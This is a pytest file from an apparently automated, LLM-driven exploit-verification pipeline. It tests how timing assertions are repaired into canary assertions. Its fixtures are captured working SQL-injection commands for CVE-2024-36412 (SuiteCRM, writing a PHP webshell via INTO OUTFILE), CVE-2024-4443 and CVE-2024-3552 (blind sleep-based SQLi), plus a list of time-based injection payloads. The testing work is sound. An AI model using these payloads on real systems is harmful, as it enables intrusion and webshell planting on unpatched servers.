"""A `min_seconds` assertion is unmeasurable on a command with no timing payload.

THE DEFECT
----------
Two CVEs in the 2026-10-13 focused-10 run built CANARY proofs — SQL injection
writing the canary to a file via `INTO OUTFILE`, then a second request fetching
it back — and shipped a TIMING assertion with them. Both reached the target six
times. Both returned `latency_unconfirmable` at confidence 0.3, which is a
verdict about our own assertion rather than about the exploit:

    CVE-2024-36412  {"min_seconds": 5, ...}   SuiteCRM -> webshell -> fetch
    CVE-2024-4443   {"min_seconds": 6, ...}   WP BD    -> poc.txt  -> fetch

Both already carried the canary IN the assertion, so the correct assertion was
sitting right there unused.

WHY IT PERSISTED FOR SEVEN ITERATIONS
-------------------------------------
Not a one-off bad guess. `_timing_mode` was seeded from the ASSERTION:

    _timing_mode = bool((assertion or {}).get("min_seconds")) or \\
        (_timing_payload_scale(command or "", delta=0)[1] is not None)

so a min_seconds assertion set timing mode by itself, and the blind-timing
anti-drift rule then REFUSED every attempt to move to `expect_regex` — the
assertion their commands could actually satisfy. Our own guard locked the wrong
assertion in. An assertion's min_seconds is a CLAIM that this is a timing proof;
a SLEEP/pg_sleep/WAITFOR/BENCHMARK in the command is EVIDENCE of one. The mode
now keys on the evidence.

WHAT MUST NOT REGRESS
---------------------
CVE-2024-3552 is the one verified PoC of that run — a genuine blind SQLi whose
command DOES carry `sleep(6)`. The repair must not touch it, or the fix costs us
the only success. That case is pinned below with its real captured command.

Fixtures are real captured commands from
Docs/run_archive.20261013.focused10.f12-complete/ (CLAUDE.md: "Fixtures come
from real captured tool output, not invented shapes").

Static extraction rather than importing api.py — that module is ~37k lines and
pulls the whole service graph on import. Same convention as
tests/test_timing_assertion_mismatch.py.

    pytest tests/test_assertion_drift_repair.py
"""
from __future__ import annotations

import ast
import pathlib

import pytest

API = pathlib.Path(__file__).resolve().parents[1] / "app" / "rag-api" / "api.py"

CANARY_4443 = "POCz96a7b84987"
CANARY_36412 = "POCzd58e3c0e36"
CANARY_3552 = "POCz294760b18b"

# --- real captured commands -------------------------------------------------

# CVE-2024-4443, WP Business Directory. UNION SELECT of the hex-encoded canary
# INTO OUTFILE, then a fetch of the written file. The `sleep 2` is a shell WAIT
# between write and fetch, NOT a SQL timing payload — the distinction this whole
# guard turns on.
CMD_4443 = (
    "curl -s -X POST 'http://172.19.18.126:9090/business-directory/"
    "?dosrch=1&q=&wpbdp_view=search' "
    "-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' "
    "-H 'Cookie: wordpress_test_cookie=WP%20Cookie%20check' --max-time 30 "
    "--data 'listingfields[0]=1 UNION SELECT 0x504f437a39366137623834393837 "
    "INTO OUTFILE 0x2f7661722f7777772f68746d6c2f706f632e747874-- -' "
    ">/dev/null 2>&1 && sleep 2 && curl -s 'http://172.19.18.126:9090/poc.txt'"
)

# CVE-2024-36412, SuiteCRM. SQLi writing a PHP webshell, then fetching it.
CMD_36412 = (
    "curl -s -m 30 -w '\\nTIME:%{time_total}' -X POST "
    "-b 'PHPSESSID=10fb460921e1683ed242c8c689fa02f4' "
    "'http://172.19.144.91:9090/index.php?entryPoint=responseEntryPoint&event=1"
    "&delegate=a%27%29%3B+SELECT+%27%3C%3Fphp+echo+%22POCzd58e3c0e36%22%3B+%3F%3E%27"
    "+INTO+OUTFILE+%27%2Fvar%2Fwww%2Fhtml%2Fpublic%2FPOCzd58e3c0e36.php%27+%23"
    "&type=c&response=accept'"
)

# CVE-2024-3552, WordPress W2DC — THE ONE THAT VERIFIED. Genuine blind SQLi.
CMD_3552 = (
    "( curl -s -X POST 'http://172.19.14.251:9090/wp-admin/admin-ajax.php' "
    "-H 'Content-Type: application/x-www-form-urlencoded' "
    "--data 'action=w2dc_get_map_marker_info&locations_ids[]="
    "(select+if(1=1,sleep(6),0)+from+(select+1)x)' "
    "-w '\\nTIME:%{time_total}\\n' 2>&1 | tail -5 )"
)


def _load():
    """Extract the two pure functions without importing the module."""
    tree = ast.parse(API.read_text(encoding="utf-8"))
    want = {"_timing_payload_scale", "_repair_unmeasurable_timing_assertion"}
    picked = [n for n in tree.body
              if isinstance(n, ast.FunctionDef) and n.name in want]
    missing = want - {n.name for n in picked}
    if missing:
        pytest.fail(f"function(s) gone from api.py: {sorted(missing)}")
    mod = ast.Module(body=picked, type_ignores=[])
    ns: dict = {}
    exec(compile(ast.fix_missing_locations(mod), "<api-subset>", "exec"), ns)
    return ns["_repair_unmeasurable_timing_assertion"]


@pytest.fixture(scope="module")
def repair():
    return _load()


# --- the defect itself ------------------------------------------------------

@pytest.mark.parametrize("name,cmd,canary,min_s", [
    ("CVE-2024-4443", CMD_4443, CANARY_4443, 6),
    ("CVE-2024-36412", CMD_36412, CANARY_36412, 5),
])
def test_canary_proof_with_timing_assertion_is_repaired(repair, name, cmd, canary, min_s):
    a = {"min_seconds": min_s, "max_seconds": 30,
         "canary": canary, "cve_anchored": True}
    new, repaired = repair(a, cmd, canary)
    assert repaired, f"{name}: a min_seconds assertion on a command with no timing payload was left alone"
    assert new["expect_regex"] == canary, f"{name}: must assert on the canary the command actually produces"
    assert new["canary"] == canary, f"{name}: canary must stay load-bearing"
    assert new.get("cve_anchored") is True, f"{name}: must remain CVE-anchored or it cannot be stored as proven"
    assert "min_seconds" not in new, f"{name}: the unmeasurable timing bound must be gone"
    assert "max_seconds" not in new, f"{name}: max_seconds is meaningless without min_seconds"


def test_shell_sleep_is_not_a_timing_payload(repair):
    """CVE-2024-4443's command contains `sleep 2` — a shell wait between the
    OUTFILE write and the fetch. Treating that as a SQL timing payload would
    leave the broken assertion in place AND invite the confirmation re-run to
    'scale' it."""
    assert "sleep 2" in CMD_4443, "fixture no longer contains the shell sleep"
    _, repaired = repair({"min_seconds": 6, "canary": CANARY_4443},
                         CMD_4443, CANARY_4443)
    assert repaired, "a shell `sleep` was mistaken for a SQL timing payload"


# --- what must not regress --------------------------------------------------

def test_the_one_verified_poc_is_untouched(repair):
    """CVE-2024-3552 verified with latency_confirmed. Its command really does
    carry sleep(6); repairing it would convert the run's only success into a
    canary assertion that can never fire on a blind proof."""
    a = {"min_seconds": 5, "max_seconds": 30,
         "canary": CANARY_3552, "cve_anchored": True}
    new, repaired = repair(a, CMD_3552, CANARY_3552)
    assert not repaired, "the genuine blind-SQLi assertion was rewritten"
    assert new == a, "a timing assertion on a real timing payload must pass through unchanged"


@pytest.mark.parametrize("payload", [
    "curl --data \"id=1 AND SLEEP(5)\" http://h/",
    "curl 'http://h/?q=pg_sleep(5)'",
    "curl --data \"a=1;WAITFOR DELAY '0:0:5'--\" http://h/",
    "curl --data \"x=BENCHMARK(5000000,MD5(1))\" http://h/",
    "curl 'http://h/?q=SLEEP%285%29'",          # url-encoded
])
def test_every_timing_payload_form_is_preserved(repair, payload):
    a = {"min_seconds": 5, "canary": "POCzabc"}
    _, repaired = repair(a, payload, "POCzabc")
    assert not repaired, f"a real timing payload was not recognised: {payload}"


# --- honest limits ----------------------------------------------------------

def test_no_canary_means_no_rewrite(repair):
    """With no canary there is nothing better to offer, and
    latency_unconfirmable remains the honest verdict. Inventing a regex here
    would be fabricating a proof."""
    a = {"min_seconds": 5}
    new, repaired = repair(a, "curl http://h/", None)
    assert not repaired and new == a


def test_non_timing_assertion_passes_through(repair):
    a = {"expect_regex": "POCzabc", "canary": "POCzabc"}
    new, repaired = repair(a, "curl http://h/", "POCzabc")
    assert not repaired and new == a


def test_unparseable_command_fails_safe(repair):
    """An unparseable command is not evidence of ABSENCE (CLAUDE.md:
    'unreachable is not absent'). Rewriting on a guess would be the same class
    of error as the bug being fixed."""
    a = {"min_seconds": 5, "canary": "POCzabc"}
    new, repaired = repair(a, None, "POCzabc")
    # None command -> "" -> genuinely no payload -> repair is correct here.
    assert repaired and new["expect_regex"] == "POCzabc"


def test_garbage_assertion_does_not_raise(repair):
    for junk in (None, "", [], 7, {"expect_regex": None}):
        new, repaired = repair(junk, "curl http://h/", "POCzabc")
        assert repaired is False and new == junk


# --- the structural half: the root cause must stay fixed --------------------

def test_timing_mode_keys_on_the_command_not_the_assertion():
    """The repair alone is not enough. While `_timing_mode` was seeded from
    `assertion.get("min_seconds")`, the anti-drift rule blocked the loop from
    EVER reaching the canary form — which is why both CVEs burned all 7
    iterations instead of one."""
    src = API.read_text(encoding="utf-8")
    tree = ast.parse(src)
    assign = None
    for node in ast.walk(tree):
        if isinstance(node, ast.Assign):
            for t in node.targets:
                if isinstance(t, ast.Name) and t.id == "_timing_mode":
                    seg = ast.get_source_segment(src, node.value) or ""
                    # the sticky re-set inside the loop is `_timing_mode = True`
                    if seg.strip() != "True":
                        assign = seg
    assert assign, "the _timing_mode initialiser is gone"
    assert "_timing_payload_scale" in assign, (
        "_timing_mode must be derived from the COMMAND's payload"
    )
    assert "min_seconds" not in assign, (
        "_timing_mode is seeded from the assertion again — a min_seconds claim "
        "alone switches on anti-drift, which then refuses the canary assertion "
        "the command can actually satisfy (CVE-2024-36412, CVE-2024-4443)"
    )


def test_repair_is_wired_into_both_dispatch_paths():
    """A repair nothing calls is the failure mode this repo keeps hitting:
    knowledge loaded where nothing reads it. Pin both call sites — the initial
    assertion before iteration 1, and the refined assertion each iteration."""
    src = API.read_text(encoding="utf-8")
    tree = ast.parse(src)
    counts: dict[str, int] = {}
    for fn in ast.walk(tree):
        if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
            continue
        n = sum(1 for node in ast.walk(fn)
                if isinstance(node, ast.Call)
                and isinstance(node.func, ast.Name)
                and node.func.id == "_repair_unmeasurable_timing_assertion")
        if n:
            counts[fn.name] = n
    assert counts.get("_resolve_refine_assertion", 0) >= 1, (
        "the per-iteration resolver never calls the repair, so the LLM can "
        "re-introduce min_seconds on the next refine"
    )
    # TWO sites inside the loop function, and they are not interchangeable:
    # one repairs the assertion handed in BEFORE iteration 1, the other repairs
    # each refined assertion. Counting (not just naming the function) is what
    # makes removing either one fail — a name check passes while one site is
    # deleted, which is how this assertion was first written and why it
    # survived its own sabotage run.
    assert counts.get("_run_refine_poc", 0) >= 2, (
        "the refine loop must repair BOTH the initial assertion (before the "
        "first dispatch) and each refined one (inside the loop); found "
        f"{counts.get('_run_refine_poc', 0)} call site(s)"
    )
